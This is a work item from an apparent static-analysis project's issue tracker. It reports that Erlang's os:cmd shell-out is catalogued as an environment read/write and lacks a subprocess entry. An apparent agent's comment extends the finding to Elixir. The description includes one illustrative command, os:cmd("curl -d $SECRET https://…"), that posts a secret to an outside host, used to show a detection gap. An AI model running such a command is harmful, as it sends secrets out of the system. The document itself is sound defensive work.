  data:  # 8ba2
    kind: work_item  # 8ba2
    title: "erlang.yaml has NO subprocess section and catalogues os:cmd (the shell-out) as env_read + env_write beside getenv/putenv"  # 8ba2
    status: todo_hard  # 8ba2
    priority: 1  # 8ba2
    parent:  # 8ba2
    tags:  # 8ba2
    - io_boundary  # 8ba2
    - catalog  # 8ba2
    - security  # 8ba2
    isbefore: []  # 8ba2
    duplicate_of: []  # 8ba2
    not_duplicate_of: []  # 8ba2
    pr_ref:  # 8ba2
    description: "Found while measuring the multi-boundary population for INV-gahuz.\n\n`os:cmd/1` is Erlang's shell-out — it runs a command through the OS shell and\nreturns its output. In `io_primitives/erlang.yaml` it is catalogued as:\n\n    line 150   env_read:   module os, functions [getenv, type, version,\n                           system_time, perf_counter, cmd]\n    line 158   env_write:  module os, functions [putenv, unsetenv, cmd]\n\n...i.e. as an ENVIRONMENT READ and WRITE, sitting beside `getenv` and `putenv`.\nIt looks like `cmd` was swept along with the rest of the `os` module.\n\nAND erlang.yaml HAS NO `subprocess:` SECTION AT ALL. Verified two ways: no\n`^subprocess:` key in the file, and `load_catalog(\"erlang\")` yields 0 primitives\nwith `boundary == \"subprocess\"` — the only one of the 14 shipped catalogues\nwith none. So Erlang's process-launch surface is not merely mis-keyed, it is\nabsent.\n\nCONSEQUENCES, each following from a boundary the tag never carries:\n  * `{boundary: subprocess, must_not_exist: true}` over an Erlang repo can\n    never find a chain, whatever the code does;\n  * no `*** HIGH RISK ***` marking, which exists on the invariant that\n    launching an external program is arbitrary code execution;\n  * the auto-derived taint sink lands in the wrong zone (ADR-0017 2b):\n    `env_read` maps to a SOURCE label (`host_secret`) rather than a subprocess\n    sink, so `os:cmd(Cmd)` is modelled as data coming IN rather than a command\n    going OUT;\n  * INV-gahuz's opacity gate keys on catalogued opaque rows, so an Erlang\n    launch does not block a clean verdict either — `os:cmd(\"curl -d $SECRET\n    https://…\")` leaves both the detection and the coverage arm silent.\n\nCONTRAST WITH ELIXIR, which shares the BEAM and gets it right — elixir.yaml\nline 221 carries a `subprocess:` section with the comment \"Subprocess —\nSystem.cmd, System.shell, Port.open\" and `functions: [cmd, shell, halt]`, noted\n\"Elixir System.cmd launches external processes\". So the correct shape exists in\nthis repo already; erlang.yaml just does not have it.\n\nSCOPE NOT YET MEASURED, and named rather than guessed: I have not checked\nwhether the Erlang analyzer emits a call edge for `os:cmd/1` in the shape the\ncatalogue would match (module slot `os`, name `cmd`, call_construct). Until that\nis measured, adding the rows is a CEILING, not a payoff — the same distinction\nthat made INV-linub's L2-only fix measure as a win at the analyzer and produce\nzero new findings. Do that measurement first.\n\nAlso unchecked: whether `erlang:open_port/2` (the other launch primitive, and\nthe one `os:cmd` is implemented on top of) is catalogued anywhere. It should be\npart of the same fix."  # 8ba2
    fields: {}  # 8ba2
- op: discuss  # a992
  at: '2026-08-13T08:53:48Z'  # a992
  by: agent  # a992
  actor: jgstern_agent  # a992
  clock: 2  # a992
  nonce: a992  # a992
  message: "CORRECTION to this item's own contrast, measured while re-censusing INV-zumin.\n\nThis item says elixir 'shares the BEAM and gets it right'. That is true of System.cmd and FALSE of os.cmd. Measured with production's load_catalog / lookup_with_module across all 14 shipped catalogues:\n\n    erlang  os.cmd  ->  env_read   (env_write declared, unreachable)\n    elixir  os.cmd  ->  env_read   (env_write declared, unreachable)\n\nBoth catalogues file the BEAM shell-out under the os module as env_read + env_write, beside getenv/putenv. elixir additionally carries a subprocess: section for System.cmd / System.shell, which is what the contrast in this description actually observed -- so elixir has BOTH the correct row for its own idiom AND the same mis-keyed row for the Erlang-interop one. An Elixir program calling :os.cmd/1 (which is idiomatic and common) is in exactly the state this item describes for Erlang.\n\nSo the fix is TWO catalogues, not one, and the parity test should enumerate every BEAM-family catalogue rather than assert erlang alone.\n\nUNCHANGED, and still the gating step: the emission-shape measurement this item asks for FIRST has not been done. Adding rows before it is a ceiling, not a payoff -- INV-linub's L2-only fix measured as a win at the analyzer and produced zero new findings. os.cmd also appears in INV-zumin's multi-boundary census (class (e) there), so whichever lands first should not silently re-key the row the other is measuring."  # a992
